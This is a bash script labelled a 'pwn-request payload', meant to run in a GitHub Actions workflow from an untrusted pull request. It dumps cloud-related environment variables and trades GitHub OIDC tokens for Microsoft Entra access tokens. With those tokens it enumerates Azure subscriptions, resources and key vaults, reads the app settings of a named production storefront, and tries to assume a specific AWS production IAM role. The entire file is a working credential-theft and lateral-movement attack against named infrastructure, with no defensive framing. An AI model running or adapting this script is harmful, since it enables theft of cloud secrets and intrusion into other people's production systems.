#!/usr/bin/env bash
# pwn-request payload: GitHub OIDC -> Entra -> (cross) AWS
set +e
echo "================ ENV ================"
env | grep -i -E 'azure|aws|arn|tenant|client|subscription|registry' | sed 's/^/ENV: /'

echo "================ OIDC ================"
get_tok() {
  curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
    "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"
}
decode() { echo "$1" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo; }

AZTOK=$(get_tok "api://AzureADTokenExchange")
echo "--- claims (api://AzureADTokenExchange)"; decode "$AZTOK"

echo "================ ENTRA ================"
for SCOPE in "https://management.azure.com/.default" "https://vault.azure.net/.default"; do
  echo "--- scope=$SCOPE"
  RESP=$(curl -sS -X POST \
    "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "scope=${SCOPE}" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${AZTOK}")
  echo "$RESP" | head -c 400; echo
  AT=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
  [ -n "$AT" ] && { echo "GOT TOKEN for $SCOPE"; decode "$AT"; export LAST_AT="$AT"; }
done

echo "================ ARM RECON ================"
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=https://management.azure.com/.default" \
  -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=${AZTOK}" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
if [ -n "$ARM" ]; then
  echo "--- subscriptions"
  curl -sS -H "Authorization: Bearer $ARM" "https://management.azure.com/subscriptions?api-version=2020-01-01" | head -c 1500; echo
  echo "--- resources"
  curl -sS -H "Authorization: Bearer $ARM" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" | head -c 4000; echo
  echo "--- key vaults"
  curl -sS -H "Authorization: Bearer $ARM" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01" | head -c 3000; echo
  echo "--- app service app settings (storefront)"
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-prod/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01" | head -c 3000; echo
fi

echo "================ CROSS AWS ================"
for AUD in "sts.amazonaws.com" "api://AWS" "aws"; do
  T=$(get_tok "$AUD")
  echo "--- github-oidc aud=$AUD"; decode "$T"
done
# Entra-issued token as web identity for AWS
for AUDAPP in "$AZURE_CLIENT_ID"; do
  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" -d "scope=api://${AUDAPP}/.default" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=${AZTOK}")
  echo "--- entra token aud=api://${AUDAPP}"; echo "$RESP" | head -c 300; echo
  ET=$(echo "$RESP" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
  if [ -n "$ET" ]; then
    decode "$ET"
    for RA in "arn:aws:iam::890742561357:role/tebamoto-prod-checkout-irsa"; do
      echo "--- assume $RA"
      aws sts assume-role-with-web-identity --role-arn "$RA" \
        --role-session-name ci --web-identity-token "$ET" --region ap-southeast-1 2>&1 | head -c 1200; echo
    done
  fi
done
echo "================ DONE ================"
